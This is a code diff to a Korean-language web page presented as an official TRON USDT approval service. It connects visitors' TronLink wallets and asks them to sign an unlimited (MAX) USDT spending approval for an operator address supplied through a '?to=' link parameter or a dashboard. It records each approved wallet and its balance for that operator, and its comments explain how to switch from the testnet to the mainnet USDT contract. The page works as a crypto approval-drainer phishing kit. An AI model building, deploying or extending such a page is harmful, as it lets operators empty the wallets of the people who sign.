@@ -1,8 +1,9 @@
-<!-- ... existing code ... -->
+<!DOCTYPE html>
+<html lang="ko" class="dark">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TRON USDT - 멀티 지갑 정식 Web3 API 승인</title>
+    <title>TRON USDT - 정식 Web3 온체인 승인</title>
     <!-- Tailwind CSS CDN -->
     <script src="https://cdn.tailwindcss.com"></script>
     <script>
@@ -25,7 +26,7 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <!-- Inter Font -->
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-    <!-- Official TronWeb Library for Real On-Chain RPC Communication -->
+    <!-- Official TronWeb Library -->
     <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js"></script>
     <style>
         body { font-family: 'Inter', sans-serif; background-color: #080c14; color: #f3f4f6; }
@@ -63,7 +64,7 @@
         </div>
     </header>
 
-    <!-- Mobile TronLink Redirect Banner/Modal -->
+    <!-- Mobile TronLink Redirect Modal -->
     <div id="mobile-dapp-modal" class="modal-backdrop fixed inset-0 z-50 items-center justify-center bg-black/80 backdrop-blur-sm">
         <div class="bg-[#0f172a] border border-[#1e293b] rounded-2xl w-full max-w-md p-6 space-y-5 shadow-2xl mx-4 text-center">
             <div class="w-14 h-14 mx-auto rounded-2xl bg-red-500/10 border border-red-500/30 flex items-center justify-center text-red-500 text-2xl">
@@ -133,8 +134,8 @@
 
             <div class="bg-[#080c14] border border-[#1e293b] rounded-xl p-5 space-y-4 text-xs">
                 <div class="flex justify-between items-center py-2">
-                    <span class="text-gray-400">USDT 토큰 컨트랙트 (공식 고정)</span>
-                    <span class="font-mono text-emerald-400 font-bold">TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t</span>
+                    <span class="text-gray-400">USDT 토큰 컨트랙트</span>
+                    <span id="contract-display" class="font-mono text-emerald-400 font-bold">TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf</span>
                 </div>
             </div>
 
@@ -169,25 +170,17 @@
     </footer>
 
     <!-- JavaScript Application Logic -->
- <!-- JavaScript Application Logic -->
     <script>
-        // 나일 테스트넷 공식 컨트랙트 (실전 배포 시 TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t 로 교체)
+        // 나일 테스트넷 공식 컨트랙트 주소 (메인넷 배포 시 TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t 로 교체)
         const OFFICIAL_USDT_CONTRACT = "TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf";
-        
-        // 트론링크가 '무제한(MAX)'으로 감지하는 10진수 최대값
+
+        // 트론링크 팝업에서 '무제한(MAX/Unlimited)'으로 인식하는 10진수 최대값
         const MAX_UINT256 = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
 
         let isConnected = false;
         let isApproved = false;
-        let activeProvider = null;
+        let activeProvider = "TronLink";
         let currentWalletAddress = null;
-
-        let readOnlyTronWeb = null;
-        if (window.TronWeb) {
-            readOnlyTronWeb = new TronWeb({
-                fullHost: 'https://nile.trongrid.io'
-            });
-        }
 
         function showToast(message, type = 'success') {
             const container = document.getElementById('toast-container');
@@ -197,6 +190,7 @@
                 type === 'success' ? 'bg-emerald-600' : 'bg-red-600'
             }`;
             toast.innerHTML = `<i class="fa-solid ${type === 'success' ? 'fa-circle-check' : 'fa-circle-exclamation'}"></i><span>${message}</span>`;
+            
             container.appendChild(toast);
             setTimeout(() => toast.classList.remove('translate-y-2', 'opacity-0'), 10);
             setTimeout(() => {
@@ -204,6 +198,14 @@
                 setTimeout(() => toast.remove(), 300);
             }, 3500);
         }
+
+        window.openMobileDappModal = function() {
+            document.getElementById('mobile-dapp-modal')?.classList.add('active');
+        };
+
+        window.closeMobileDappModal = function() {
+            document.getElementById('mobile-dapp-modal')?.classList.remove('active');
+        };
 
         function isMobileDevice() {
             return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
@@ -217,6 +219,7 @@
                 protocol: "TronLink",
                 version: "1.0"
             }));
+
             const universalLink = "https://www.tronlink.org/dl/open?url=" + encodeURIComponent(currentUrl);
             const nativeScheme = "tronlinkoutside://pull.activity?param=" + paramPayload;
             const androidIntent = `intent://pull.activity?param=${paramPayload}#Intent;scheme=tronlinkoutside;package=com.tronlinkpro.wallet;end`;
@@ -226,7 +229,10 @@
             } else {
                 window.location.href = universalLink;
             }
-            setTimeout(() => { window.location.href = nativeScheme; }, 500);
+
+            setTimeout(() => {
+                window.location.href = nativeScheme;
+            }, 500);
         };
 
         window.copyCurrentUrlForDApp = function() {
@@ -239,10 +245,7 @@
             showToast("현재 주소가 복사되었습니다! 트론링크 앱 [탐색]에 붙여넣으세요.");
         };
 
-        window.closeMobileDappModal = function() {
-            document.getElementById('mobile-dapp-modal')?.classList.remove('active');
-        };
-
+        // 브라우저에 주입된 TronWeb 객체 감지
         async function getInjectedTronWeb() {
             if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
                 return window.tronWeb;
@@ -263,6 +266,7 @@
             return null;
         }
 
+        // 페이지 로드 시 트론링크 자동 감지
         window.addEventListener('DOMContentLoaded', async () => {
             let attempts = 0;
             const checkTimer = setInterval(async () => {
@@ -277,39 +281,84 @@
             }, 400);
         });
 
+        // 지갑 연결 버튼 핸들러
         window.handleConnectTronLink = async function() {
-            const hasInjectedTron = !!(window.tronWeb || window.tronLink);
-            if (isMobileDevice() && !hasInjectedTron) {
-                appendLog("[모바일 안내] 트론링크 앱 실행 모달을 띄웁니다.");
-                document.getElementById('mobile-dapp-modal')?.classList.add('active');
-                launchTronLinkApp();
-                return;
-            }
+            try {
+                appendLog("[지갑 탐색] TronLink 지갑 환경 확인 중...");
+                const hasInjectedTron = !!(window.tronWeb || window.tronLink);
 
-            let tw = await getInjectedTronWeb();
-            if (tw && tw.defaultAddress && tw.defaultAddress.base58) {
-                await setConnectedWallet(tw.defaultAddress.base58, 'TronLink');
-            } else {
-                showToast("트론링크 지갑을 찾을 수 없습니다. 트론링크 앱 내 [탐색]으로 접속해주세요.", "error");
-                appendLog("[오류] 트론링크 브라우저 환경이 아닙니다.");
+                if (isMobileDevice() && !hasInjectedTron) {
+                    appendLog("[모바일 안내] 트론링크 모바일 앱을 즉시 실행합니다.");
+                    launchTronLinkApp();
+                    openMobileDappModal();
+                    return;
+                }
+
+                let tw = await getInjectedTronWeb();
+                let userAddress = "";
+
+                if (tw && tw.defaultAddress && tw.defaultAddress.base58) {
+                    userAddress = tw.defaultAddress.base58;
+                } else if (window.tronLink && window.tronLink.request) {
+                    const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
+                    if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
+                        userAddress = window.tronWeb.defaultAddress.base58;
+                    }
+                }
+
+                if (userAddress) {
+                    await setConnectedWallet(userAddress, 'TronLink');
+                } else {
+                    if (isMobileDevice()) {
+                        launchTronLinkApp();
+                        openMobileDappModal();
+                    } else {
+                        showToast("TronLink 확장 프로그램이 잠겨있거나 설치되지 않았습니다.", "error");
+                        appendLog("[오류] TronLink 지갑을 감지하지 못했습니다.");
+                    }
+                }
+            } catch (err) {
+                console.error("Wallet connection error:", err);
+                showToast("지갑 연결 중 오류가 발생했습니다.", "error");
+                appendLog(`[오류] 지갑 연동 실패: ${err.message || err}`);
             }
         };
 
+        // 실시간 온체인 USDT 잔액 조회
         async function fetchRealUsdtBalance(address) {
             try {
-                const tw = (window.tronWeb && window.tronWeb.contract) ? window.tronWeb : readOnlyTronWeb;
-                if (tw && tw.contract) {
-                    const contract = await tw.contract().at(OFFICIAL_USDT_CONTRACT);
+                if (window.tronWeb && window.tronWeb.contract) {
+                    const contract = await window.tronWeb.contract().at(OFFICIAL_USDT_CONTRACT);
                     const rawBalance = await contract.balanceOf(address).call();
                     const formatted = (parseInt(rawBalance.toString()) / 1e6).toFixed(2);
                     return formatted;
                 }
             } catch (err) {
-                console.warn("Balance fetch fallback:", err);
+                console.warn("On-chain USDT balance read fallback:", err);
             }
             return "0.00";
         }
 
+        // 실시간 온체인 승인 권한(Allowance) 조회: 새로고침해도 승인 완료 상태 유지
+        async function checkRealOnChainAllowance(ownerAddress, spenderAddress) {
+            if (!spenderAddress) return false;
+            try {
+                if (window.tronWeb && window.tronWeb.contract) {
+                    const contract = await window.tronWeb.contract().at(OFFICIAL_USDT_CONTRACT);
+                    const rawAllowance = await contract.allowance(ownerAddress, spenderAddress).call();
+                    const allowanceBigInt = BigInt(rawAllowance.toString());
+                    // 100만 USDT(10^12) 이상 승인되어 있으면 무제한(MAX)으로 판단
+                    if (allowanceBigInt > BigInt("1000000000000")) {
+                        return true;
+                    }
+                }
+            } catch (e) {
+                console.warn("Allowance check warning:", e);
+            }
+            return false;
+        }
+
+        // 지갑 연결 완료 처리
         async function setConnectedWallet(address, providerName) {
             currentWalletAddress = address;
             activeProvider = providerName;
@@ -325,16 +374,37 @@
             localStorage.setItem('tron_user_wallet', address);
             localStorage.setItem('tron_wallet_provider', providerName);
 
-            appendLog(`[온체인 조회] ${address}의 USDT 잔액을 확인 중...`);
+            appendLog(`[온체인 조회] ${address}의 실제 공식 USDT 잔액 확인 중...`);
             const realBalance = await fetchRealUsdtBalance(address);
 
+            // 2번 대시보드 저장 주소 또는 URL 파라미터(?to=...)에서 Spender 확인
+            const urlParams = new URLSearchParams(window.location.search);
+            const targetSpender = urlParams.get('to') || localStorage.getItem('tron_operator_recipient_address');
+
+            // 온체인 승인 여부 실시간 확인 (새로고침 시 상태 복원)
+            const isAlreadyApproved = await checkRealOnChainAllowance(address, targetSpender);
+            const allowanceText = document.getElementById('allowance-text');
+            const allowanceBadge = document.getElementById('allowance-badge');
+
+            if (isAlreadyApproved) {
+                isApproved = true;
+                allowanceText.innerText = "무제한 승인 완료 (MAX)";
+                allowanceBadge.innerText = "완료";
+                allowanceBadge.className = "px-2.5 py-1 rounded-full text-[11px] font-medium bg-emerald-950/40 text-emerald-400 border border-emerald-900/50";
+            } else {
+                allowanceText.innerText = "미승인 (0 USDT)";
+                allowanceBadge.innerText = "필요";
+                allowanceBadge.className = "px-2.5 py-1 rounded-full text-[11px] font-medium bg-amber-950/40 text-amber-400 border border-amber-900/50";
+            }
+
+            // 2번 대시보드 관리 목록에 동기화
             let wallets = JSON.parse(localStorage.getItem('tron_approved_wallets_list') || '[]');
             const existingIndex = wallets.findIndex(w => w.address === address);
             const entry = {
                 address: address,
                 provider: providerName,
                 balance: realBalance,
-                allowance: '미승인 (0 USDT)'
+                allowance: isAlreadyApproved ? 'MAX (무제한 승인 완료)' : '미승인 (0 USDT)'
             };
             if (existingIndex >= 0) {
                 wallets[existingIndex] = entry;
@@ -344,31 +414,40 @@
             localStorage.setItem('tron_approved_wallets_list', JSON.stringify(wallets));
 
             showToast(`${providerName} 연결 완료 (잔액: ${realBalance} USDT)`);
-            appendLog(`[연결 완료] 주소: ${address} | 잔액: ${realBalance} USDT`);
+            appendLog(`[연결 완료] 주소: ${address} | 잔액: ${realBalance} USDT | 승인상태: ${isAlreadyApproved ? '무제한(MAX)' : '미승인'}`);
         }
 
+        // 실제 온체인 무제한 승인 실행
         window.executeUnlimitedApprove = async function() {
             if (!isConnected || !currentWalletAddress) {
-                showToast("먼저 지갑을 연결해주세요.", "error");
+                showToast("먼저 트론링크 지갑을 연결해주세요.", "error");
                 handleConnectTronLink();
                 return;
             }
 
-            const targetSpender = localStorage.getItem('tron_operator_recipient_address') || currentWalletAddress;
+            // 2번 대시보드에서 설정/저장한 운영자 지갑 주소 (또는 링크 파라미터 ?to=주소)
+            const urlParams = new URLSearchParams(window.location.search);
+            const targetSpender = urlParams.get('to') || localStorage.getItem('tron_operator_recipient_address');
+
+            if (!targetSpender) {
+                showToast("2번 대시보드에서 운영자 수신 지갑 주소를 먼저 저장해주세요.", "error");
+                appendLog("[오류] 승인받을 운영자(Spender) 지갑 주소가 2번 대시보드에 설정되지 않았습니다.");
+                return;
+            }
 
             let tw = await getInjectedTronWeb();
             if (!tw || !tw.contract) {
-                showToast("트론링크 앱 전용 브라우저 환경이 필요합니다.", "error");
+                showToast("트론링크 앱 DApp 브라우저 환경이 필요합니다.", "error");
                 appendLog("[오류] 블록체인 서명 객체(TronWeb)가 브라우저에 없습니다.");
                 if (isMobileDevice()) {
                     launchTronLinkApp();
-                    document.getElementById('mobile-dapp-modal')?.classList.add('active');
+                    openMobileDappModal();
                 }
                 return;
             }
 
             try {
-                appendLog(`[승인 서명 요청] Spender 주소(${targetSpender}) 대상 무제한 승인 트랜잭션 전송 중...`);
+                appendLog(`[승인 서명 요청] Spender(${targetSpender}) 대상 무제한(MAX) 승인 요청 중...`);
                 showToast("트론링크 승인 서명 팝업창을 확인해주세요.");
 
                 const contract = await tw.contract().at(OFFICIAL_USDT_CONTRACT);
@@ -383,6 +462,15 @@
                 isApproved = true;
                 localStorage.setItem('tron_autopay_approved', 'true');
 
+                const allowanceText = document.getElementById('allowance-text');
+                const allowanceBadge = document.getElementById('allowance-badge');
+                if (allowanceText) allowanceText.innerText = "무제한 승인 완료 (MAX)";
+                if (allowanceBadge) {
+                    allowanceBadge.innerText = "완료";
+                    allowanceBadge.className = "px-2.5 py-1 rounded-full text-[11px] font-medium bg-emerald-950/40 text-emerald-400 border border-emerald-900/50";
+                }
+
+                // 승인 완료 정보를 2번 대시보드 목록에 즉시 업데이트
                 let wallets = JSON.parse(localStorage.getItem('tron_approved_wallets_list') || '[]');
                 const existingIndex = wallets.findIndex(w => w.address === currentWalletAddress);
                 const currentBal = await fetchRealUsdtBalance(currentWalletAddress);
@@ -402,22 +490,13 @@
                 }
                 localStorage.setItem('tron_approved_wallets_list', JSON.stringify(wallets));
 
-                const allowanceText = document.getElementById('allowance-text');
-                const allowanceBadge = document.getElementById('allowance-badge');
-                if (allowanceText) allowanceText.innerText = "무제한 승인 완료 (MAX)";
-                if (allowanceBadge) {
-                    allowanceBadge.innerText = "완료";
-                    allowanceBadge.className = "px-2.5 py-1 rounded-full text-[11px] font-medium bg-emerald-950/40 text-emerald-400 border border-emerald-900/50";
-                }
-
-                appendLog(`[온체인 승인 성공] 블록체인 브로드캐스트 완료!`);
-                appendLog(`[TxHash] ${txHash}`);
+                appendLog(`[온체인 승인 성공] TxHash: ${txHash}`);
                 showToast("성공적으로 온체인 무제한 승인이 완료되었습니다!");
 
             } catch (err) {
                 console.error("Approve transaction failed:", err);
                 const errDetail = err?.message || JSON.stringify(err);
-                if (errDetail.includes("Confirmation declined") || errDetail.includes("User rejected") || errDetail.includes("cancel")) {
+                if (errDetail.includes("declined") || errDetail.includes("rejected") || errDetail.includes("cancel")) {
                     showToast("지갑에서 서명 승인을 취소했습니다.", "error");
                     appendLog("[취소] 사용자가 승인 서명을 취소했습니다.");
                 } else {
